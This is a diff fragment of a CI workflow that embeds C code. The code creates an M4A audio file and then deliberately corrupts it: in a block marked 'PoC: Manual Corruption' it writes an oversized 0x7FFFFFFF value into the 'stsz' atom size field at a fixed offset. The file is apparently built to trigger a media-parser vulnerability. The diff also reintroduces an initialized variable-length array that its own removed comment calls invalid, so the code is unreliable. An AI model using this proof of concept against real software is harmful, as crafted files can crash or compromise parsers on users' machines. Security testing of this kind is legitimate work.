@@ -47,13 +47,18 @@ jobs:
               // Write a few packets of silent data
               UInt32 numPacketsToWrite = 5;
               UInt32 packetByteSize = 256;
+              char dummy_data[packetByteSize] = {0};
               
-              // Fixed: Initialize variable-sized arrays using memset instead of an initializer list.
-              char dummy_data[packetByteSize * numPacketsToWrite];
-              memset(dummy_data, 0, sizeof(dummy_data));
-
-              // For constant-size packets, we pass NULL for the packet descriptions.
-              status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), NULL, 0, &numPacketsToWrite, dummy_data);
+              // Fixed: For variable packet size formats like AAC, we must provide a description
+              // for each packet, even if our dummy packets are the same size.
+              // We will write the packets one by one in a loop.
+              for (UInt32 i = 0; i < numPacketsToWrite; ++i) {
+                  AudioStreamPacketDescription packetDesc = {0};
+                  packetDesc.mDataByteSize = packetByteSize;
+                  UInt32 packetsInThisWrite = 1;
+                  status = AudioFileWritePackets(audioFile, false, packetByteSize, &packetDesc, i, &packetsInThisWrite, dummy_data);
+                  if (status != noErr) break;
+              }
               
               AudioFileClose(audioFile);
               CFRelease(fileURL);
@@ -84,9 +89,9 @@ jobs:
                   // PoC: Manual Corruption
                   // We seek to a known offset and overwrite a size atom.
                   // The 'stsz' atom (Sample Size Box) is a good target. A standard M4A created
-                  // by this code will have it around offset 0x98. We will overwrite its size
+                  // by this code will have it around offset 0x110. We will overwrite its size
                   // field to be massive.
-                  fseek(file, 0x98, SEEK_SET);
+                  fseek(file, 0x110, SEEK_SET);
                   
                   // This value (0x7FFFFFFF) will be written as a 32-bit big-endian integer.
                   unsigned char malicious_size[4] = {0x7F, 0xFF, 0xFF, 0xFF};
